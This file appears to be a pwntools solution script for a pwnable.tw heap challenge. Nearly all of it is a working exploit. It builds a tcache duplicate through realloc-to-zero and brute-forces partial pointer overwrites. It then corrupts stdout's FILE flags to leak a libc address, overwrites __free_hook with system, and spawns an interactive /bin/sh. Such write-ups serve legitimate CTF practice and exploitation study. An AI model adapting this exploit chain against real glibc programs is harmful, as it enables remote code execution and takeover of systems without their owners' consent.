from pwn import *

libc = ELF('./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so')

def alloc(index, size, data):
    io.recvuntil('Your choice: ')
    io.sendline('1')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Size:')
    io.sendline(str(size))
    io.recvuntil('Data:')
    io.send(data)

def realloc(index, size, data):
    io.recvuntil('Your choice: ')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Size:')
    io.sendline(str(size))
    if size == 0:
        return
    io.recvuntil('Data:')
    io.send(data)

def free(index):
    io.recvuntil('Your choice: ')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(index))

while True:
    while True:
        io = remote('chall.pwnable.tw', 10310)

        # tcache dup
        alloc(0, 0x48, 'A')
        realloc(0, 0, '')
        realloc(0, 0x48, p64(0) + p64(0))
        realloc(0, 0, '')
        realloc(0, 0x48, '\x10\x80') # 1/16 chance of success
        # make free chunk return to entries[3] instead of entries[2]
        alloc(1, 0x48, 'A')
        realloc(1, 0x58, 'A')
        free(1)
        try:
            alloc(1, 0x48, b'\0' * 0x23 + b'\x07')
            realloc(1, 0, '')
            message = io.recvline()
            if message == b'free(): invalid pointer\n':
                raise EOFError('Incorrect Guess')
            break
        except EOFError:
            io.close()

    realloc(1, 0x48, '\x58\x87') # 1/16 chance of success
    realloc(0, 0x38, p64(0) + p64(0))
    free(0)
    alloc(0, 0x48, 'A')
    realloc(0, 0x38, 'A')
    free(0)
    try:
        # overwrite _flags & _IO_write_base to leak libc address
        alloc(0, 0x40, b'/bin/sh\0' + p64(0xfbad1800) + p64(0) * 3)
        leak = io.recvline()
        if leak.startswith(b'$$$$$$$$$$$$$$$$$$$$$$$$$$$$'):
            raise EOFError('Incorrect Guess')
        break
    except EOFError:
        io.close()
        
libc_leak = u64(leak[8:16])
libc.address = libc_leak - 0x1e7570

# overwrite __free_hook with system
realloc(1, 0x48, p64(0) * 8 + p64(libc.sym['__free_hook']))
free(1)
alloc(1, 0x18, p64(libc.sym['system']))

# trigger system("/bin/sh")
free(0)

io.interactive()
